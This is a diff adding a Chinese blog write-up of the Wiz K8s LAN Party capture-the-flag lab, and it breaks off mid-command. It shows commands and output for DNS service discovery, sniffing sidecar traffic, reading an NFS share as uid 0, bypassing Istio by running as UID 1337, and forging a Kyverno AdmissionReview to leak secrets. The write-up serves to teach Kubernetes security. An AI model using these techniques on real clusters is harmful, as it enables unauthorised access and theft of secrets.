@@ -12,4 +12,227 @@
         <tag>other</tag>
       </tags>
   </entry>
+  <entry>
+    <title>k8slanparty</title>
+    <url>/2024/12/24/k8slanparty/</url>
+    <content><![CDATA[<h1 id="k8slanparty"><a href="#k8slanparty" class="headerlink" title="k8slanparty"></a>k8slanparty</h1><p><a href="https://www.k8slanparty.com/challenge/1">网站地址</a></p>
+<h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DNSing with the stars</span><br><span class="line">You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.</span><br><span class="line"></span><br><span class="line">As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag. We have &quot;loaded your machine with dnscan to ease this process for further challenges.</span><br><span class="line"></span><br><span class="line">All the flags in the challenge follow the same format: wiz_k8s_lan_party&#123;*&#125;</span><br><span class="line"></span><br><span class="line">Challenge value: 10 pts.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用星星进行DNS</span><br><span class="line">您可以通过shell访问此页面底部受损的Kubernetes pod，您的下一个目标是进一步损害其他内部服务。</span><br><span class="line">作为热身，利用DNS扫描来发现隐藏的内部服务并获取标记。我们“为您的机器加载了dnscan，以简化这一过程，应对进一步的挑战。</span><br><span class="line">挑战中的所有标志都遵循相同的格式：wiz_k8s_lan_party&#123;*&#125;</span><br><span class="line">挑战值：10分。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/k8slanparty/image-20241221154810476.png" alt="image-20241221154810476"></p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>查看<code>/etc/resolv.conf</code>配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ cat /etc/resolv.conf </span><br><span class="line">search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal</span><br><span class="line">nameserver 10.100.120.34</span><br><span class="line">options ndots:5</span><br><span class="line">player@wiz-k8s-lan-party:~$ </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>search</code> 域名后缀列表，其中包含了 <code>k8s-lan-party.svc.cluster.local</code>，<code>svc.cluster.local</code>，<code>cluster.local</code> 等 Kubernetes 默认的域名后缀。这意味着，所有未完全限定的域名查询会自动尝试追加这些后缀。</li>
+<li>nameserver 10.100.120.34<code>表示 DNS 服务器的 IP 地址为</code>10.100.120.34<code>。所有 DNS 查询会通过这个 DNS 服务器进行解析。</code></li>
+<li>ndots:5<code> 表示，若查询的域名中至少包含 5 个点（</code>.<code>），则会尝试直接进行查询，而不会追加 </code>search&#96; 域名后缀。</li>
+</ol>
+<p>通过内置的dnscan扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.*.*</span><br><span class="line">35017 / 65536 [-----------------------------------------------------------------------------------------------&gt;___________________________________________________________________________________] 53.43% 963 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65434 / 65536 [----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&gt;] 99.84% 961 p/s10.100.136.254 -&gt; getflag-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>
+
+<p>配置对应图</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------------------------------------------+</span><br><span class="line">|                   Kubernetes Cluster                    |</span><br><span class="line">| -------------------------------------------------------- |</span><br><span class="line">|                                                          |</span><br><span class="line">|  +-------------------+          +------------------+    |</span><br><span class="line">|  |    Service:       |          |  Pod:            |    |</span><br><span class="line">|  | getflag-service   |          |  getflag-service |    |</span><br><span class="line">|  | k8s-lan-party.svc |&lt;-----&gt;    |  pod-abc-xyz     |    |</span><br><span class="line">|  | cluster.local     |          |  10.100.136.10   |    |</span><br><span class="line">|  | Cluster IP        |&lt;--------&gt;|                  |    |</span><br><span class="line">|  | 10.100.136.254    |          +------------------+    |</span><br><span class="line">|  +-------------------+                                   |</span><br><span class="line">|          |                                               |</span><br><span class="line">|          |                                               |</span><br><span class="line">|  +--------------------+         +---------------------+  |</span><br><span class="line">|  | DNS Resolver       |&lt;--------|  DNS Server:        |  |</span><br><span class="line">|  | 10.100.120.34      |         |  10.100.120.34      |  |</span><br><span class="line">|  | (kube-dns)         |         |                     |  |</span><br><span class="line">|  +--------------------+         +---------------------+  |</span><br><span class="line">|          |                                               |</span><br><span class="line">|          |                                               |</span><br><span class="line">|  +------------------------+      +---------------------+ |</span><br><span class="line">|  | Service Discovery (DNS) |&lt;----&gt;|   k8s API Server    | |</span><br><span class="line">|  | getflag-service.k8s-lan- |      |  (kube-apiserver)   | |</span><br><span class="line">|  | party.svc.cluster.local |      |  IP: 10.100.120.34  | |</span><br><span class="line">|  +------------------------+      +---------------------+ |</span><br><span class="line">|          |                                               |</span><br><span class="line">|          |                                               |</span><br><span class="line">|  +------------------------+      +---------------------+ |</span><br><span class="line">|  | Pod DNS Config (via DNS)|      |  Node IP:           | |</span><br><span class="line">|  | /etc/resolv.conf        |      |  10.100.120.34      | |</span><br><span class="line">|  | 10.100.120.34           |&lt;----&gt;|   (Master Node)     | |</span><br><span class="line">|  +------------------------+      +---------------------+ |</span><br><span class="line">|          |                                               |</span><br><span class="line">|          |                                               |</span><br><span class="line">|  +-----------------------+                              |</span><br><span class="line">|  |  Service IP:          |                              |</span><br><span class="line">|  |  10.100.136.254       |&lt;-----------------------------|</span><br><span class="line">|  |  DNS Name:            |</span><br><span class="line">|  |  getflag-service.k8s- |</span><br><span class="line">|  |  lan-party.svc.cluster|</span><br><span class="line">|  |  .local               |</span><br><span class="line">|  +-----------------------+</span><br><span class="line">|</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后直接curl就可以出来flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ curl 10.100.136.254</span><br><span class="line">wiz_k8s_lan_party&#123;between-thousands-of-ips-you-found-your-northen-star&#125;player@wiz-k8s-lan-party:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="后语"><a href="#后语" class="headerlink" title="后语"></a>后语</h3><p><strong>本章学习知识，dns扫描</strong></p>
+<p><a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue</a></p>
+<p><strong>权限进入</strong></p>
+<p>这个挑战限制了权限，但是如果是正常的权限进入pod的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#找到对应的 Pod 名称</span><br><span class="line">kubectl get pods -n k8s-lan-party -l app=getflag-service</span><br><span class="line">#pod</span><br><span class="line">kubectl exec -it getflag-service-pod-xyz -n k8s-lan-party -- /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>DNS 扫描的作用</strong>：通过 DNS 扫描可以在没有直接访问权限的情况下，发现 Kubernetes 集群中的服务和资源。</p>
+<p>dnscan工具</p>
+<p><a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e</a></p>
+<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello?</span><br><span class="line">Sometimes, it seems we are the only ones around, but we should always be on guard against invisible sidecars reporting sensitive secrets.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你好？</span><br><span class="line">有时，似乎只有我们在身边，但我们应该时刻警惕那些泄露敏感秘密的隐形旁门左道。</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ cat /etc/resolv.conf </span><br><span class="line">search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal</span><br><span class="line">nameserver 10.100.60.37</span><br><span class="line">options ndots:5</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.*.*</span><br><span class="line">43718 / 65536 [-----------------------------------------------------------------------------------------------------------------------&gt;___________________________________________________________] 66.71% 962 p/s10.100.171.123 reporting-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">49124 / 65536 [--------------------------------------------------------------------------------------------------------------------------------------&gt;____________________________________________] 74.96% 963 p/s^C</span><br></pre></td></tr></table></figure>
+
+<p>这里通过流量监听操作获取内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ tcpdump -i ns-28fab6 -nn -vvv host 10.100.171.123</span><br><span class="line">tcpdump: listening on ns-28fab6, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:37:07.572286 IP (tos 0x0, ttl 127, id 4843, offset 0, flags [DF], proto TCP (6), length 60)</span><br><span class="line">    192.168.1.243.59400 &gt; 10.100.171.123.80: Flags [S], cksum 0x78a9 (incorrect -&gt; 0x4603), seq 3520262491, win 64240, options [mss 1460,sackOK,TS val 809480906 ecr 0,nop,wscale 7], length 0</span><br><span class="line">08:37:07.572375 IP (tos 0x0, ttl 127, id 0, offset 0, flags [DF], proto TCP (6), length 60)</span><br><span class="line">     。。。。</span><br><span class="line">        POST / HTTP/1.1</span><br><span class="line">        Host: reporting-service</span><br><span class="line">        User-Agent: curl/7.64.0</span><br><span class="line">        Accept: */*</span><br><span class="line">        Content-Length: 63</span><br><span class="line">        Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">        wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;</span><br><span class="line">08:37:07.572436 IP (tos 0x0, ttl 127, id 17054, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    10.100.171.123.80 &gt; 192.168.1.243.59400: Flags [.], cksum 0x78a1 (incorrect -&gt; 0x2e99), seq 1, ack 215, win 508, options [nop,nop,TS val 3186952350 ecr 809480906], length 0</span><br><span class="line">08:37:07.574121 IP (tos 0x0, ttl 127, id 17055, offset 0, flags [DF], proto TCP (6), length 257)</span><br><span class="line">    10.100.171.123.80 &gt; 192.168.1.243.59400: Flags [P.], cksum 0x796e (incorrect -&gt; 0xc7fc), seq 1:206, ack 215, win 508, options [nop,nop,TS val 3186952352 ecr 809480906], length 205: HTTP, length: 205</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        server: istio-envoy</span><br><span class="line">        date: Sat, 21 Dec 2024 08:37:07 GMT</span><br><span class="line">        content-type: text/plain</span><br><span class="line">        x-envoy-upstream-service-time: 1</span><br><span class="line">        x-envoy-decorator-operation: :0/*</span><br><span class="line">        transfer-encoding: chunked</span><br><span class="line"></span><br><span class="line">        0</span><br><span class="line"></span><br><span class="line">08:37:07.574129 IP (tos 0x0, ttl 127, id 4846, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    192.168.1.243.59400 &gt; 10.100.171.123.80: Flags [.], cksum 0x78a1 (incorrect -&gt; 0x2dcf), seq 215, ack 206, win 501, options [nop,nop,TS val 809480908 ecr 3186952352], length 0</span><br><span class="line">08:37:07.574227 IP (tos 0x0, ttl 127, id 4847, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    192.168.1.243.59400 &gt; 10.100.171.123.80: Flags [F.], cksum 0x78a1 (incorrect -&gt; 0x2dce), seq 215, ack 206, win 501, options [nop,nop,TS val 809480908 ecr 3186952352], length 0</span><br><span class="line">    。。。。</span><br><span class="line">20 packets captured</span><br><span class="line">20 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">player@wiz-k8s-lan-party:~$ </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="后语-1"><a href="#后语-1" class="headerlink" title="后语"></a>后语</h3><p><strong>本章学习知识，Sidecar 容器</strong></p>
+<p><a href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/</a></p>
+<p><strong>Sidecar 模式</strong>是 Kubernetes 中的一种常见设计模式，通常是指将一个附加的容器（Sidecar 容器）与主应用容器（Primary 容器）一起部署在同一个 Pod 中。这些 Sidecar 容器通常提供辅助功能，如日志处理、监控、代理、身份验证、配置管理等。</p>
+<h4 id="不安全的容器通信"><a href="#不安全的容器通信" class="headerlink" title="不安全的容器通信"></a><strong>不安全的容器通信</strong></h4><p><strong>问题：</strong><br>Sidecar 容器与主应用容器之间的通信可能未加密或未授权。比如，一些容器可能在明文方式下传输敏感数据，或者 Sidecar 容器未经授权地访问主容器的数据。</p>
+<p><strong>攻击路径：</strong></p>
+<ul>
+<li>如果 Sidecar 容器作为代理容器或日志收集器工作，它可能会与主容器之间进行通信，传输敏感信息。如果该通信没有加密，攻击者可能通过监听容器间的流量来窃取信息。</li>
+</ul>
+<p><strong>操作：</strong></p>
+<ol>
+<li><p><strong>监听容器间通信：</strong><br>如果容器使用了共享的网络命名空间，可以尝试监听容器间的通信流量。攻击者可以使用 <code>tcpdump</code> 或类似的工具来捕获未加密的流量。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -nn -vvv</span><br></pre></td></tr></table></figure>
+
+<p>这将捕获所有网络接口的流量，可以识别出主应用和 Sidecar 容器之间的通信。</p>
+</li>
+<li><p><strong>分析流量：</strong><br>如果捕获的数据包是未加密的，攻击者可以通过分析流量来获取敏感信息，例如身份验证令牌、日志内容等。</p>
+</li>
+<li><p><strong>注入恶意数据：</strong><br>如果攻击者能通过某些方式拦截并修改容器间的通信流量，就可能执行中间人攻击（MITM），篡改应用数据或执行权限提升。</p>
+</li>
+</ol>
+<h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exposed File Share</span><br><span class="line">The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">暴露的文件共享</span><br><span class="line">目标大公司在生产中使用过时但受云支持的技术进行数据存储。但是，天哪，这项技术是在访问控制仅基于网络的时代引入的🤦‍️。</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>这里题目打不开了，看参考链接师傅的wp可以看到是网络文件共享问题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount可以直接看到文件，但是由于权限问题直接获取不了，就用了nfsv4去获取</span><br><span class="line">#mount</span><br><span class="line">fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.23.121,local_lock=none,addr=192.168.124.98)</span><br><span class="line">#nfsv4直接获取不到</span><br><span class="line">player@wiz-k8s-lan-party:~$ nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4</span><br><span class="line"></span><br><span class="line">----------  1     1     1           73 flag.txt</span><br><span class="line">#</span><br><span class="line">player@wiz-k8s-lan-party:~$ nfs-cat &quot;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&amp;gid=0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>等环境好了再去复现吧</p>
+<h2 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The Beauty and The Ist</span><br><span class="line">Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don&#x27;t abuse this power; use it responsibly and with caution.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">美丽与第一</span><br><span class="line">显然，新的服务网格技术对超级精英用户（根用户）具有独特的吸引力。不要滥用这种权力；负责任地谨慎使用它。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: security.istio.io/v1beta1</span><br><span class="line">kind: AuthorizationPolicy</span><br><span class="line">metadata:</span><br><span class="line">  name: istio-get-flag</span><br><span class="line">  namespace: k8s-lan-party</span><br><span class="line">spec:</span><br><span class="line">  action: DENY</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: &quot;&#123;flag-pod-name&#125;&quot;</span><br><span class="line">  rules:</span><br><span class="line">  - from:</span><br><span class="line">    - source:</span><br><span class="line">        namespaces: [&quot;k8s-lan-party&quot;]</span><br><span class="line">    to:</span><br><span class="line">    - operation:</span><br><span class="line">        methods: [&quot;POST&quot;, &quot;GET&quot;]</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~# cat /etc/resolv.conf </span><br><span class="line">search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal</span><br><span class="line">nameserver 10.100.166.132</span><br><span class="line">options ndots:5</span><br><span class="line"></span><br><span class="line">root@wiz-k8s-lan-party:~# dnscan -subnet 10.100.*.*</span><br><span class="line">57333 / 65536 [------------------------------------------------------------------------------------------------------------------------------------------------------------&gt;______________________] 87.48% 932 p/s10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>
+
+<p>Istio 的 Sidecar 代理（通常是 Envoy）通过 iptables 规则拦截和管理 Pod 的网络流量，以实现服务网格的功能。然而，某些配置可能被利用来绕过这些流量管理机制。以下是常见的绕过方法及其实现原理：</p>
+<ol>
+<li><strong>UDP 协议绕过</strong>：Istio 默认仅处理 TCP 流量，而不拦截 UDP 数据包。因此，使用 UDP 协议的通信不会经过 Envoy 代理，从而绕过 Istio 的流量管理和安全控制。</li>
+<li><strong>使用 UID 1337 的用户</strong>：Istio 的 Sidecar 代理通常以 UID 1337 运行，并在 iptables 中设置规则，避免拦截该 UID 的流量。如果 Pod 中的主容器也以 UID 1337 运行，其流量将被视为代理自身的流量，从而避开流量重定向，直接与外部通信。<br>ISTIO</li>
+<li><strong>CAP_SETUID 权限的利用</strong>：如果容器具有 CAP_SETUID 权限（默认授予），进程可以将其 UID 更改为 1337。通过将进程的 UID 设置为 1337，流量同样可以绕过 Istio 的流量拦截机制。</li>
+<li><strong>CAP_NET_ADMIN 权限的利用</strong>：拥有 CAP_NET_ADMIN 权限的容器可以修改自身的网络设置，包括 iptables 规则。攻击者可以利用此权限更改或清除 Istio 设置的 iptables 规则，从而绕过 Envoy 代理的流量管理。</li>
+</ol>
+<p>这里是用不了kubectl，所以用其他方法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">getent passwd</span><br><span class="line">#istio:x:1337:1337::/home/istio:/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/k8slanparty/image-20241224163316073.png" alt="image-20241224163316073"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~# su istio</span><br><span class="line">$ id</span><br><span class="line">uid=1337(istio) gid=1337(istio) groups=1337(istio)</span><br><span class="line">$ curl 10.100.224.159</span><br><span class="line">wiz_k8s_lan_party&#123;only-leet-hex0rs-can-play-both-k8s-and-linux&#125;$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="后语-2"><a href="#后语-2" class="headerlink" title="后语"></a>后语</h3><p><a href="https://istio.io/v1.11/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf">https://istio.io/v1.11/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf</a></p>
+<p>这里有bypass的内容</p>
+<p><img src="/img/k8slanparty/image-20241224162013806.png" alt="image-20241224162013806"></p>
+<p>具体方式</p>
+<p><img src="/img/k8slanparty/image-20241224162049052.png" alt="image-20241224162049052"></p>
+<p><a href="https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables">https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables</a></p>
+<h2 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Who will guard the guardians?</span><br><span class="line">Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">谁来守护守护者？</span><br><span class="line">当pods被外国政权改变时，有人可能会滥用其官僚机构并泄露行政部门的敏感信息。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">题目辅助链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: kyverno.io/v1</span><br><span class="line">kind: Policy</span><br><span class="line">metadata:</span><br><span class="line">  name: apply-flag-to-env</span><br><span class="line">  namespace: sensitive-ns</span><br><span class="line">spec:</span><br><span class="line">  rules:</span><br><span class="line">    - name: inject-env-vars</span><br><span class="line">      match:</span><br><span class="line">        resources:</span><br><span class="line">          kinds:</span><br><span class="line">            - Pod</span><br><span class="line">      mutate:</span><br><span class="line">        patchStrategicMerge:</span><br><span class="line">          spec:</span><br><span class="line">            containers:</span><br><span class="line">              - name: &quot;*&quot;</span><br><span class="line">                env:</span><br><span class="line">                  - name: FLAG</span><br><span class="line">                    value: &quot;&#123;flag&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>策略为每个容器注入一个名为 <code>FLAG</code> 的环境变量。</p>
+<h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.*.*</span><br><span class="line">22052 / 65536 [------------------------------------------------------------&gt;______________________________________________________________________________________________________________________] 33.65% 967 p/s10.100.86.210 kyverno-cleanup-controller.kyverno.svc.cluster.local.</span><br><span class="line">32137 / 65536 [---------------------------------------------------------------------------------------&gt;___________________________________________________________________________________________] 49.04% 969 p/s10.100.126.98 kyverno-svc-metrics.kyverno.svc.cluster.local.</span><br><span class="line">40480 / 65536 [--------------------------------------------------------------------------------------------------------------&gt;____________________________________________________________________] 61.77% 970 p/s10.100.158.213 kyverno-reports-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">43767 / 65536 [-----------------------------------------------------------------------------------------------------------------------&gt;___________________________________________________________] 66.78% 969 p/s10.100.171.174 kyverno-background-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">55738 / 65536 [--------------------------------------------------------------------------------------------------------------------------------------------------------&gt;__________________________] 85.05% 966 p/s10.100.217.223 kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">59217 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------------------------------&gt;_________________] 90.36% 966 p/s10.100.232.19 kyverno-svc.kyverno.svc.cluster.local.</span><br><span class="line">65430 / 65536 [----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&gt;] 99.84% 969 p/s10.100.86.210 -&gt; kyverno-cleanup-controller.kyverno.svc.cluster.local.</span><br><span class="line">10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.</span><br><span class="line">65536 / 65536 [----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------] 100.00% 971 p/s</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong>IP 地址</strong></th>
+<th><strong>服务名称</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>10.100.86.210</code></td>
+<td><code>kyverno-cleanup-controller</code></td>
+<td>负责清理与策略相关的多余资源，可能与策略无直接关系。</td>
+</tr>
+<tr>
+<td><code>10.100.126.98</code></td>
+<td><code>kyverno-svc-metrics</code></td>
+<td>Kyverno 的 Prometheus 指标暴露服务，提供监控数据。</td>
+</tr>
+<tr>
+<td><code>10.100.158.213</code></td>
+<td><code>kyverno-reports-controller-metrics</code></td>
+<td>Kyverno 报告生成和控制器的指标接口，提供报表相关数据。</td>
+</tr>
+<tr>
+<td><code>10.100.171.174</code></td>
+<td><code>kyverno-background-controller-metrics</code></td>
+<td>背景任务控制器指标接口，可能不直接涉及策略注入功能。</td>
+</tr>
+<tr>
+<td><code>10.100.217.223</code></td>
+<td><code>kyverno-cleanup-controller-metrics</code></td>
+<td>清理任务控制器的指标接口，可能不直接涉及策略注入功能。</td>
+</tr>
+<tr>
+<td><strong><code>10.100.232.19</code></strong></td>
+<td><strong><code>kyverno-svc</code></strong></td>
+<td><strong>Kyverno 的核心服务，负责解析和执行策略（Mutate 等功能）</strong></td>
+</tr>
+</tbody></table>
+<p>这里需要利用 Kubernetes 的 <strong>Mutating Admission Webhook</strong> 的机制，通过伪造一个创建 Pod 的请求触发 Kyverno 的策略修改（如注入环境变量），并最终获取注入的敏感数据（<code>FLAG</code>）。</p>
+<p><strong>Mutating Admission Webhook</strong></p>
+<ul>
+<li>Kubernetes 的 Admission Webhook 可以在资源被创建或更新时拦截请求并执行修改操作。</li>
+<li>在本题中，Kyverno 的 Mutating Webhook 会为新建的 Pod 自动注入环境变量 <code>FLAG</code>。</li>
+</ul>
+<p><strong>伪造 AdmissionReview 请求</strong></p>
+<ul>
+<li>Kyverno 通过 <code>/mutate</code> 路径监听 Admission Webhook 的请求。</li>
+<li>如果我们构造一个合法的 AdmissionReview 请求（如模拟创建一个 Pod 的操作），Kyverno 会自动注入其策略中定义的内容（如 <code>FLAG</code>），并返回修改的内容。</li>
+</ul>
+<p><strong>获取 Webhook 返回的数据</strong></p>
+<ul>
+<li>Webhook 返回的数据中包含一个 <code>patch</code> 字段，表示修改的具体内容（即注入的环境变量值）。</li>
+<li>我们可以通过解码 <code>patch</code> 字段的内容提取 <code>FLAG</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H &quot;Content-Type: application/json&quot; --data &#x27;&#123;&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;705ab4f5-6393-11e8-b7cc-42010a800002&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;uid&quot;:&quot;014fbff9a07c&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;example-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&